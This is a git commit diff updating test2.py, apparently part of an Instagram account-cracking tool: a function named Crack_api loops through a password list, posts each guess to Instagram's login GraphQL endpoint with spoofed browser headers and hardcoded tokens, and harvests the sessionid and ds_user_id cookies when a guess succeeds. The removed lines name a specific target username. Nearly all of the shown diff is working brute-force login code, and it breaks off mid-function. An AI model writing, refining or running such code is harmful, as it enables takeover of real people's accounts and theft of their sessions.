59a945b58582ad898726792bcd9646cbc91451e6
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2026-09-05 00:11:01 +0530

    Update test2.py

--- test2.py
+++ test2.py
@@ -784,36 +784,122 @@ def Crack_api(username, kontol):
     for password in kontol:
         try:
             ses = requests.Session()
-            response = ses.get('https://www.instagram.com/accounts/login/')
+            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)    str(uuid.uuid4()).upper(),
+            session = requests.Session()
+            response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{'626743'}"
-            enc_password_encoded = urllib.parse.quote(enc_password)
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
+            cookies = {
+            'csrftoken': csrftoken,
+            'datr': 'Lo1RaQ0s2F5q7mq6H-pASwAf',
+            'ig_did': str(uuid.uuid4()).upper(),
+            'mid': 'aVGNLgALAAH2E0OEaISl_MAnse8K',
+            'wd': '885x779',}
             headers = {
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-            'sec-ch-ua-model': '""',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/',
+            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Brave";v="143.0.0.0", "Chromium";v="143.0.0.0", "Not A(Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
-            'X-IG-App-ID': '936619743392459',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Accept': '*/*',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-Instagram-AJAX': '1045824267',
-            'X-CSRFToken': csrf_token,
-            'X-Web-Session-ID': 'vnolst:phqive:f5i8pp',
-            'Referer': 'https://www.instagram.com/mimi_roy_44/',
-            'X-IG-Max-Touch-Points': '0',
-            'X-ASBD-ID': '359341',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-            'X-IG-WWW-Claim': 'hmac.AR0lFPVrPWfUaasIaEe7P5wZzNvi4rTJt5zBnbJl9QfE-UHY',
-            'sec-ch-ua-platform-version': '"10.0.0"',}
-            data = f'enc_password={enc_password_encoded}&caaF2DebugGroup=-1&isPrivacyPortalReq=false&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%22oneTapUsers%22%3A%22%5B%5C%2271197200037%5C%22%5D%22%7D&trustedDeviceRecords=%7B%2271197200037%22%3A%7B%22machine_id%22%3A%22afAaSAALAAH1E9oBPA3kaW94g3fT%22%2C%22nonce%22%3A%223wQWQEa1bhApmLnMUuObWk0uwmWXdePxIg9cUI7IyfEAwTLJxEJWdB4IPKme32DX%22%7D%7D&username={'pandeykarishma079'}&jazoest=22902&fb_dtsg=NAfyFFlfztZGS1a5mQLPSTxampkgFsMeFeO9BbRWiV5VgtEFJ71WCCg%3A17843709688147332%3A1787460646'
-            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
-            print(response.text)
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sec-gpc': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-fb-friendly-name': 'useCDSWebLoginMutation',
+            'x-fb-lsd': 'AdElFI6SrbI',
+            'x-ig-app-id': '936619743392459',}
+            data = {
+    'av': '0',
+    '__d': 'www',
+    '__user': '0',
+    '__a': '1',
+    '__req': 'i',
+    '__hs': '20450.HYP:instagram_web_pkg.2.1...0',
+    'dpr': '1',
+    '__ccg': 'GOOD',
+    '__rev': '1031500594',
+    '__s': '8hc0dn:fr9pfp:w7ozv3',
+    '__hsi': '7589002077230607721',
+    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24o5-1ywOwv89k2C1Fwc60D85m1mzXwae4UaEW2G0AEco5G0zK1swa-0raazo7u1xwIwbS1LwTwKG0hq1Iwqo5p0qZ6goK10xKi2K7E5y1rwGwa6byohw5yw',
+    '__csr': 'gLrcBdfPnOjPgD94Nkjia8alOkiuLih9eCAFrAh9EC9rCCxvCArzF9-4oOGXz9DHkCE_harl9G-AWHKGB-Ig8hed8Eqx8gMxDib3aFlMyrgG8yk2WXwEhqCF2oGbFrrKqGKl1dkqAF9aAle6Z4Bgeod889u2K8xWh5BGiag9Xx678K6kGDxqaAAw05F2yEoxG0sgM0rqw8O20EcuUtw6ZgowlE09ve1Fo6C8w3mU1sUK8w5kwN4wNw24VA6412Oxp03w816Hw0u5o0orw2Ko0Zm05a6',
+    '__hsdp': 'go46NSJ5UP7wlRG9UWcKm8A26gy6dDV88ogxAwkG081wYxu0iWcyAb8cGA22cGbxR1gmh28O2ia5wwa9ghx100Otwdzw6ew1ui',
+    '__hblp': '06AxuE0w63O1Nwe63q1Vwgbz8vxW3mq1qxC2G0km0Re1jwXDyo4K0eUwfG0gO2a0agwkEy2ubw2b80Si0AU1d823wOK260YE2mzEeE',
+    '__sjsp': 'go46NSJ5UP7wlRG9UWcKm8Ad4V6Nzp-i2648p85aw20of8nw4Kz8F2O3aF0wzayUtgk5AgycwAyxo82yk4ogg',
+    '__comet_req': '7',
+    'lsd': 'AdElFI6SrbI',
+    'jazoest': '2907',
+    '__spin_r': '1031500594',
+    '__spin_b': 'trunk',
+    '__spin_t': '1766952238',
+    '__crn': 'comet.igweb.PolarisCAAIGLoginHomepageRoute',
+    'fb_api_caller_class': 'RelayModern',
+    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
+    'server_timestamps': 'true',
+    'variables': json.dumps({
+        "input": {
+            "client_mutation_id": "1",
+            "actor_id": "0",
+            "app": "instagram",
+            "auth_domain_data_key": None,
+            "caa_login_request_extra_info": {
+                "ab_test_data": "",
+                "shared_prefs_data": "",
+                "cuid": "",
+                "guid": "f403aeb52f840108c",
+                "jazoest": "",
+                "lgndim": "",
+                "lgnjs": "1766686097",
+                "lgnrnd": "",
+                "locale": "",
+                "login_source": "caa_login",
+                "lsd": "",
+                "next": "",
+                "prefill_contact_point": "",
+                "prefill_source": "",
+                "prefill_type": "",
+                "skstamp": "",
+                "timezone": ""
+            },
+            "credential_type": "password",
+            "dyi_job_id": "",
+            "enc_password": {
+                "sensitive_string_value": enc_password
+            },
+            "event_request_id": "e6610824-4d9f-4a26-bc47-5614f2547640",
+            "identifier": username,
+            "ig_web_device_id": "4F436F83-C15F-456A-9365-77F0D22727E6",
+            "initial_request_id": "1",
+            "lids": None,
+            "login_source": "COMET_HEADERLESS_LOGIN",
+            "next": None,
+            "passkey_payload": None,
+            "password": {
+                "sensitive_string_value": enc_password
+            },
+            "persistent": True,
+            "query_params": "{}",
+            "trusted_device_records": "{}",
+            "use_uid_to_login": False,
+            "waterfall_id": "b6fad2ac-edb8-4edb-a187-8421bcdea7cb"
+        }
+    }),
+    'doc_id': '25351082227851825',
+}
+            # Make API request
+            response = session.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
-            all_cookies = ses.cookies.get_dict()
+            all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
             if 'sessionid' in extracted:
                 cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
